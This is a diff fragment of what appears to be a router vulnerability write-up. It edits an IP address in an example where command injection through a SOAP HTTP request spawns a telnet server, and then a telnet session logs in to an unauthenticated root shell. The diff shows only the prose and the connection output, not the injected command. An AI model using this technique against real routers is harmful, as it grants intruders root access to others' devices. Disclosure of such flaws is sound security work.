@@ -118,8 +118,8 @@ Content-Type: text/xml
 whatever-content
 
 Here, we can easily build a soap http request and embed malicious command that spawns a telnet server on WAN that provides an unauthenticated root shell into it, and then login into router using telnet:
-$ telnet 9.9.9.9 9999
-Trying 9.9.9.9...
+$ telnet 192.168.0.1 9999
+Trying 192.168.0.1...
 Connected to 192.168.0.1.
 Escape character is '^]'.
 ```
